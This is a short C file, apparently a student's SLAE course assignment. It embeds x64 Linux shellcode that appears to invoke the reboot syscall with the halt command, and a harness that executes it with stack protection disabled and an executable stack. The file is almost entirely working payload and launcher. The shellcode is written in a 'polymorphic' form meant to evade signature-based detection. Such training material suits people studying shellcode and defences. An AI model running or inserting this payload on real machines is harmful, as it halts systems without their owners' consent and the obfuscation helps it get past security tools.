/*
Filename:      shellcode-polymorphic.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  03.02.2019
Note:          x64
Compiler:      gcc -ggdb -fno-stack-protector -z execstack shellcode-polymorphic.c -o shellcode-polymorphic
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x48\x31\xff\x48\x31\xf6\x4d\x31\xd2\x48\xf7\xe6\xba\x23\x01\xef\xcd\xbe\x96\x19\x12\x05\xbf\xad\xde\xe1\xfe\xb0\xa9\x0f\x05";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
